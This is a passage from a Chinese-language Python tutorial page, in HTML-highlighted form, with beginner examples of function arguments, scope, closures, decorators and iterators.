function_">main</span>():</span><br><span class="line">    my_len()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>有返回值函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_len</span>():</span><br><span class="line">    s = <span class="string">&#x27;haha nihao&#x27;</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        length +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = my_len()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>带参数的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">maxnum</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">if</span> x&gt;y:</span><br><span class="line">        the_max = x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        the_max = y</span><br><span class="line">    <span class="keyword">return</span> the_max</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = maxnum(<span class="number">10</span>,<span class="number">12</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>带默认参数的函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">maxnum</span>(<span class="params">x,y=<span class="number">12</span></span>):</span><br><span class="line">    <span class="keyword">if</span> x&gt;y:</span><br><span class="line">        the_max = x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        the_max = y</span><br><span class="line">    <span class="keyword">return</span> the_max</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = maxnum(<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#最后返回的是99</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maxnum</span>(<span class="params">x,y=<span class="number">12</span></span>):</span><br><span class="line">    <span class="keyword">if</span> x&gt;y:</span><br><span class="line">        the_max = x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        the_max = y</span><br><span class="line">    <span class="keyword">return</span> the_max</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = maxnum(<span class="number">10</span>,<span class="number">99</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>打印函数中的注释内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    我是注释内容</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i am fun1&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(fun1.__doc__)</span><br><span class="line">    <span class="built_in">print</span>(fun1.__name__)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="14-函数各种参数类型"><a href="#14-函数各种参数类型" class="headerlink" title="14.函数各种参数类型"></a>14.函数各种参数类型</h3><p>默认参数是一个可变的数据类型</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># li一直存在并且添加的内容会增加进li</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">a, li=[]</span>):</span><br><span class="line">    li.append(a)</span><br><span class="line">    <span class="built_in">print</span>(li)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    demo(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line">    demo(<span class="string">&#x27;cde&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>不定长参数 *args—-不管以什么形式进来都会被转换成元组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>(<span class="params">name,age,*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;name is:&quot;</span>,name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;age is:&quot;</span>,age)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;args is:&quot;</span>,args)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;other 1:&quot;</span>,args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#写法1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    t = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">    <span class="comment">#t=(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;)同理</span></span><br><span class="line">    fun1(*t)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#写法2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>传入字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun2</span>(<span class="params">**dic</span>):</span><br><span class="line">    <span class="built_in">print</span>(dic)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dic1 = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">12</span>,<span class="string">&quot;job&quot;</span>:<span class="string">&quot;driver&quot;</span>&#125;</span><br><span class="line">    fun2(**dic1)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>多种参数传递</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>(<span class="params">a,b,*args,**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,name=<span class="string">&quot;n1&quot;</span>,job=<span class="string">&quot;n2&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>匿名函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    x = <span class="keyword">lambda</span> y,z:y+z</span><br><span class="line">    <span class="built_in">print</span>(x(<span class="number">2</span>,<span class="number">3</span>))<span class="comment">#5</span></span><br></pre></td></tr></table></figure><h3 id="15-作用域"><a href="#15-作用域" class="headerlink" title="15.作用域"></a>15.作用域</h3><p>locals()</p><p>本地（函数）定义的所有变量都会以字典的形式存在这里</p><p>globals()</p><p>在外部定义的所有变量都会以字典的形式存在这里</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">100</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    <span class="comment">#声明使用全局变量</span></span><br><span class="line">    <span class="keyword">global</span> c</span><br><span class="line">    c = c+<span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="comment">#改变了c的大小,此时全局变量c为102</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() :</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>列表字典集合可以直接用不需要声明全局变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">li =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    li.append(<span class="number">99</span>)</span><br><span class="line">    <span class="built_in">print</span>(li)</span><br><span class="line">    <span class="built_in">print</span>(dic)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>nonlocal</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_b</span>():</span><br><span class="line">    b=<span class="number">1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_global</span>():</span><br><span class="line">        b=<span class="number">10</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dd_nonlocal</span>():</span><br><span class="line">            <span class="comment">#声明使用上一层的b</span></span><br><span class="line">            <span class="keyword">nonlocal</span> b <span class="comment">#b=10</span></span><br><span class="line">            b=b+<span class="number">20</span> <span class="comment">#b=30</span></span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        dd_nonlocal()</span><br><span class="line">        <span class="built_in">print</span>(b)<span class="comment">#此时b是30，因为nonlocal开始修改了这一层的b</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    do_global()</span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() :</span><br><span class="line">    add_b()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>函数的嵌套</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mymax</span>(<span class="params">x,y</span>):</span><br><span class="line">    m = x <span class="keyword">if</span> x&gt;y <span class="keyword">else</span> y</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maxmax</span>(<span class="params">a,b,c,d</span>):</span><br><span class="line">    res1 = mymax(a,b)</span><br><span class="line">    res2 = mymax(c,d)</span><br><span class="line">    res3 = mymax(res1,res2)</span><br><span class="line">    <span class="keyword">return</span> res3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = maxmax(<span class="number">1</span>,<span class="number">22</span>,<span class="number">333</span>,<span class="number">21</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="16-函数名的玩法"><a href="#16-函数名的玩法" class="headerlink" title="16.函数名的玩法"></a>16.函数名的玩法</h3><p>函数名里面是一个内存地址,内存地址加个括号就开始运行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;haha&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    f = fun1  <span class="comment"># f和fun1指向同一内存地址</span></span><br><span class="line">    <span class="built_in">print</span>(f)</span><br><span class="line">    f()  <span class="comment"># 等同于fun1()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 函数名里面是一个内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="17-闭包"><a href="#17-闭包" class="headerlink" title="17.闭包"></a>17.闭包</h3><p>闭包：内部函数对外部函数作用域里变量的引用</p><p>闭包实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#外函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>(<span class="params">a</span>):</span><br><span class="line">    b = <span class="number">10</span></span><br><span class="line">    <span class="comment">#内函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(a+b)</span><br><span class="line">        <span class="built_in">print</span>(inner.__closure__)<span class="comment">#判断inner是否是闭包，如果是就返回cell，如果不是就返回none</span></span><br><span class="line">    <span class="comment">#外函数返回内函数的内存地址</span></span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = outer(<span class="number">15</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)<span class="comment">#a是一个内存地址</span></span><br><span class="line">    a()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">    money = <span class="number">100</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">        name = <span class="string">&quot;apple&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">            <span class="built_in">print</span>(name,money)</span><br><span class="line">        <span class="keyword">return</span> inner</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    f = wrapper()<span class="comment">#此时f是func的内存地址</span></span><br><span class="line">    i = f()<span class="comment">#此时i是inner的内存地址</span></span><br><span class="line">    i()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="18-闭包传参"><a href="#18-闭包传参" class="headerlink" title="18.闭包传参"></a>18.闭包传参</h3><p>传值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">return</span> a*x+b</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    f = func(<span class="number">4</span>,<span class="number">5</span>)<span class="comment">#此时f是inner的内存地址，inner等待传输x</span></span><br><span class="line">    i = f(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>传址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i am fun1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">fun</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        start = time.time()<span class="comment">#获取当开始时间</span></span><br><span class="line">        fun()</span><br><span class="line">        <span class="built_in">print</span>(time.time()-start)<span class="comment">#计算程序运行了多长时间</span></span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    a = timer(fun1)</span><br><span class="line">    a()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="19-装饰器"><a href="#19-装饰器" class="headerlink" title="19.装饰器"></a>19.装饰器</h3><p>不带参数的装饰器</p><p>装饰器不影响原有函数的功能，还能添加新功能。</p><p>装饰器基于闭包</p><p>执行被装饰器修饰的函数时，装饰器函数也会执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">fun</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        start = time.time()</span><br><span class="line">        fun()</span><br><span class="line">        <span class="built_in">print</span>(time.time() - start)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器，在运行装饰器装饰的函数时，会把目标函数放到装饰器函数里运行</span></span><br><span class="line"><span class="meta">@timer</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>():</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i am fun1&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>带参数的装饰器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">fun</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">a</span>):</span><br><span class="line">        start = time.time()</span><br><span class="line">        fun(a)</span><br><span class="line">        <span class="built_in">print</span>(time.time() - start)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器，在运行装饰器装饰的函数时，会把目标函数放到装饰器函数里运行</span></span><br><span class="line"><span class="meta">@timer</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>(<span class="params">a</span>):</span><br><span class="line">    time.sleep(a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i am fun1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>包含多种参数的装饰器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args,**kwargs</span>):</span><br><span class="line">        func(*args,**kwargs)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@timer</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun1</span>(<span class="params">*args,**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(args,kwargs)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    fun1(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">123</span>,<span class="number">124</span>,name=<span class="string">&quot;haha1&quot;</span>,age=<span class="string">&quot;18&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>装饰器上传参</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>(<span class="params">flag</span>):  <span class="comment"># flag多传入true or false</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">timer</span>(<span class="params">func</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">a</span>):</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;函数开始执行&quot;</span>)</span><br><span class="line">                func(a)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;函数执行结束&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;请开启flag&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> inner</span><br><span class="line">    <span class="keyword">return</span> timer</span><br><span class="line"></span><br><span class="line"><span class="meta">@outer(<span class="params"><span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;haha---&quot;</span>, a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    func1(<span class="string">&quot;haha nihao&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main() </span><br></pre></td></tr></table></figure><h3 id="20-多个装饰器"><a href="#20-多个装饰器" class="headerlink" title="20.多个装饰器"></a>20.多个装饰器</h3><p>注意！多个装饰器的启动和结束规律</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrapper1</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;装饰器1号启动&quot;</span>)</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;装饰器1号结束&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrapper2</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;装饰器2号启动&quot;</span>)</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;装饰器2号结束&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@wrapper1</span></span><br><span class="line"><span class="meta">@wrapper2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;haha nihao&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    func1()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="21-迭代器"><a href="#21-迭代器" class="headerlink" title="21.迭代器"></a>21.迭代器</h3><p>判断是否可以迭代</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    t = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">    s = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    d = &#123;<span class="number">1</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">4</span>&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">isinstance</span>(d, Iterable))  <span class="comment"># 判断是否可以迭代</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>手工迭代</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    li_iter = li.__iter__()  <span class="comment"># 开始使用迭代器迭代</span></span><br><span class="line">    item1 = li_iter.__next__()  <span class="comment"># 迭代一个</span></span><br><span class="line">    <span class="built_in">print</span>(item1)</span><br><span class="line">    item2 = li_iter.__next__()  <span class="comment"># 迭代第二个</span></span><br><span class="line">    <span class="built_in">print</span>(item2)</span><br><span class="line">    item3 = li_iter.__next__()</span><br><span class="line">    <span class="built_in">print</span>(item3)</span><br><span class="line">    item4 = li_iter.__next__()</span><br><span class="line">    <span class="built_in">print</span>(item4)</span><br><span class="line">    item5 = li_iter.__next__()</span><br><span class="line">    <span class="built_in">print</span>(item5)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 没有东西可迭代了，所以报错</span></span><br><span class="line">    <span class="comment">#item6 = li_iter.__next__()</span></span><br><span class="line">    <span class="comment">#print(item6)</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>自动迭代</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    li_iter = li.__iter__()  <span class="comment"># 开始使用迭代器迭代</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment"># 捕获异常，如果try里面的东西出现异常，就直接运行except里的内容</span></span><br><span class="line">            item = li_iter.__next__()</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">except</span>:  <span class="comment"># 捕捉到报错就执行except内的内容</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;迭代结束&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="22-生成器"><a href="#22-生成器" class="headerlink" 